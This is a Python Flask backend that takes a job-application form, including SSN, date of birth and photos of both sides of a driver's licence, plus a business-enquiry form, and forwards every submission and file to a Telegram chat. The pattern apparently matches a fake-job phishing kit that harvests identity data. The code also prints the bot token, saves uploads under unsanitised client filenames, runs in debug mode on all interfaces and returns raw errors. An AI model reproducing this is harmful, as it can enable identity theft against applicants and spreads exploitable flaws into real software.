from flask import Flask, request, jsonify
from telegram.request import HTTPXRequest
from flask_cors import CORS
import telegram
import asyncio
import os
from dotenv import load_dotenv

load_dotenv()

dotenv_loaded = load_dotenv()
print(f".env loaded successfully: {dotenv_loaded}")
print(f"TELEGRAM_BOT_TOKEN: {os.getenv('TELEGRAM_BOT_TOKEN')}")
print(f"TELEGRAM_CHAT_ID: {os.getenv('TELEGRAM_CHAT_ID')}")


os.makedirs('uploads', exist_ok=True)

app = Flask(__name__)
CORS(app)

TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
trequest = HTTPXRequest(connection_pool_size=20)
bot = telegram.Bot(token=TELEGRAM_BOT_TOKEN, request=trequest)

async def send_form_to_telegram(message, file_paths=None):
    await bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message)
    if file_paths:
        for path in file_paths:
            with open(path, 'rb') as file:
                await bot.send_document(chat_id=TELEGRAM_CHAT_ID, document=file)

@app.route("/api/submit", methods=['POST'])
def submit_form():
    try:
        data = request.form
        full_name = data.get('fullName')
        address = data.get('address')
        phone_number = data.get('phoneNumber')
        email = data.get('email')
        ssn = data.get('ssn')
        dob = data.get('dob')
        gender = data.get('gender')
        education = data.get('education')
        work_experience = data.get('workExperience')

        resume = request.files.get('resume')
        license_front = request.files.get('licenseFront')
        license_back = request.files.get('licenseBack')

    
        file_paths = []
        if resume:
            resume_path = f'uploads/{resume.filename}'
            resume.save(resume_path)
            file_paths.append(resume_path)
        if license_front:
            front_path = f'uploads/{license_front.filename}'
            license_front.save(front_path)
            file_paths.append(front_path)
        if license_back:
            back_path = f'uploads/{license_back.filename}'
            license_back.save(back_path)
            file_paths.append(back_path)

        message = (
            f"New Application Submission\n"
            f"Full Name: {full_name}\n"
            f"Address: {address}\n"
            f"Phone Number: {phone_number}\n"
            f"Email: {email}\n"
            f"SSN: {ssn}\n"
            f"Date of Birth: {dob}\n"
            f"Gender: {gender}\n"
            f"Highest Education: {education}\n"
            f"Work Experience: {work_experience} years\n"
            f"Resume: {'Attached' if resume else 'Not Uploaded'}\n"
            f"Driver's License Front: {'Attached' if license_front else 'Not Uploaded'}\n"
            f"Driver's License Back: {'Attached' if license_back else 'Not Uploaded'}"
        )

        asyncio.run(send_form_to_telegram(message, file_paths))

        return jsonify({'status': 'success', 'message': 'Form submitted'}), 200
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route("/api/enquiry", methods=["POST"])
def submit_enquiry():
    try:
        data = request.get_json()
        name = data.get('name')
        company = data.get('company')
        title = data.get('title')
        phone = data.get('phone')
        email = data.get('email')
        services = data.get('services')
        find_us = data.get('findUs')
        other_source = data.get('otherSource')

        msg = (
            f"New Business Enquiry Submission\n"
            f"Name: {name}\n"
            f"Company: {company}\n"
            f"Title: {title}\n"
            f"Phone: {phone}\n"
            f"Email: {email}\n"
            f"Services: {services}\n"
            f"Found us: {find_us}\n"
            f"Other Source: {other_source if find_us == 'Other' else 'N/A'}"
        )

        asyncio.run(send_form_to_telegram(msg))  

        return jsonify({'status': 'success', 'message': 'Form submitted'}), 200
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5328, debug=True)